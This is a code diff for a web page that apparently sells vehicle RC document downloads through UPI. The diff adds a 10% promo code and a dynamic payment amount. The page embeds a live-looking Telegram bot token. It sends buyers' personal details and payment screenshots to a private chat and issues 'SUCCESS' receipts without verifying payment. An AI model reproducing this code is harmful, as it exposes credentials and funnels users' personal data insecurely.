@@ -44,7 +44,7 @@
         .inner-box { position: relative; background: #fff; border-radius: 11px; padding: 15px; z-index: 1; }
 
         .neon-btn {
-            position: relative; background: #000; color: #fff; font-size: 20px; font-weight: 900;
+            position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900;
             padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
             text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
@@ -70,6 +70,14 @@
         
         .wa-float { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: #fff; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; z-index: 3000; text-decoration: none; }
         .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
+
+        /* Promo UI Styles */
+        .promo-container { margin-bottom: 15px; background: #eef2ff; padding: 12px; border-radius: 12px; border: 1.5px dashed var(--ind-blue); display: flex; justify-content: space-between; align-items: center; }
+        .promo-text { text-align: left; }
+        .promo-text small { display: block; font-size: 10px; color: #666; font-weight: bold; }
+        .promo-text b { font-size: 16px; color: var(--primary); font-weight: 900; }
+        .promo-apply-btn { background: var(--ind-blue); color: #fff; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 12px; transition: 0.3s; }
+        #promo-msg { color: #138808; font-weight: bold; font-size: 13px; margin-bottom: 10px; display: none; }
     </style>
 </head>
 <body>
@@ -104,13 +112,26 @@
         </div>
 
         <div id="p2" style="display:none;">
+            <div id="promo-msg">Hurray! 🎉 WELCOME10 Applied Successfully!</div>
+            
             <button class="neon-btn" onclick="pay()"></button>
+            
             <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
                 <img id="qr" src="" width="160">
-                <p style="font-size:10px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
+                <p id="amtLabel" style="font-size:10px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
             </div>
+
+            <div class="promo-container">
+                <div class="promo-text">
+                    <small>Available Offer:</small>
+                    <b>WELCOME10</b>
+                </div>
+                <button id="applyBtn" class="promo-apply-btn" onclick="applyPromo()">APPLY</button>
+            </div>
+
             <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
             <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
+            
             <div class="neon-box">
                 <div class="inner-box">
                     <input type="file" id="ss" accept="image/*" style="width:100%;">
@@ -141,6 +162,7 @@
     <script>
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
+        let currentAmount = 120.00;
 
         function toggleM() { document.getElementById('side').classList.toggle('active'); }
         function showPop(title, msg) { alert(title + "\n\n" + msg); }
@@ -155,20 +177,42 @@
             i.value = out;
         }
 
-        function go2() {
-            if(document.getElementById('vehInput').value.length < 9) { alert("Invalid Number!"); return; }
-            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
+        function updatePaymentLinks(amt) {
+            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${amt.toFixed(2)}&cu=INR&tn=RC%20DOWNLOAD`;
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
-            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
         }
 
-        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }
+        function go2() {
+            if(document.getElementById('vehInput').value.length < 9) { alert("Invalid Number!"); return; }
+            updatePaymentLinks(currentAmount);
+            document.getElementById('p1').style.display='none'; 
+            document.getElementById('p2').style.display='block';
+        }
+
+        function applyPromo() {
+            if(currentAmount < 120) return;
+            
+            currentAmount = 108.00; // 120 - 10%
+            
+            document.getElementById('promo-msg').style.display = "block";
+            document.getElementById('amtLabel').innerText = `SCAN QR TO PAY ₹${currentAmount}`;
+            document.getElementById('applyBtn').innerText = "APPLIED";
+            document.getElementById('applyBtn').style.background = "#138808";
+            
+            updatePaymentLinks(currentAmount);
+            alert("Hurray! 🎉 10% Discount Applied. New Price: ₹108");
+        }
+
+        function pay() { 
+            const upiUrl = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmount.toFixed(2)}&cu=INR&tn=RC%20DOWNLOAD`;
+            window.location.href = upiUrl; 
+        }
 
         async function sendT(f, d, t, tx) {
             let fd = new FormData();
             let fn = document.getElementById('fatherName').value || "N/A";
             fd.append("chat_id", T_CHAT_ID); fd.append("photo", f);
-            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n📅 *Date:* ${d}\n⏰ *Time:* ${t}\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fn}\n💰 *Amt:* ₹120`);
+            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n📅 *Date:* ${d}\n⏰ *Time:* ${t}\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fn}\n💰 *Amt:* ₹${currentAmount}`);
             fd.append("parse_mode", "Markdown");
             try { await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd }); return true; } catch (e) { return false; }
         }
@@ -217,7 +261,7 @@
                 ["VEHICLE NO:", document.getElementById('vehInput').value], 
                 ["FATHER'S NAME:", fn],
                 ["WHATSAPP NO:", document.getElementById('mob').value], 
-                ["AMOUNT PAID:", "INR 120.00"], 
+                ["AMOUNT PAID:", "INR " + currentAmount.toFixed(2)], 
                 ["STATUS:", "SUCCESS"]
             ];
             data.forEach(item => { doc.rect(15, y, 180, 10); doc.text(item[0], 20, y + 7); doc.text(item[1], 85, y + 7); y += 10; });
@@ -226,8 +270,7 @@
             y += 65; doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
             doc.setFontSize(10); doc.text(["1. Digital Services Only.", "2. Non-Refundable Payment.", "3. Delivery on WhatsApp (30-60m)."], 15, y + 8);
             
-            // GOLDEN BOLD CURSIVE THANK YOU
-            doc.setTextColor(184, 134, 11); // Golden
+            doc.setTextColor(184, 134, 11);
             doc.setFont("times", "italic");
             doc.setFontSize(40);
             doc.text("Thank You", 105, y + 60, null, null, "center");
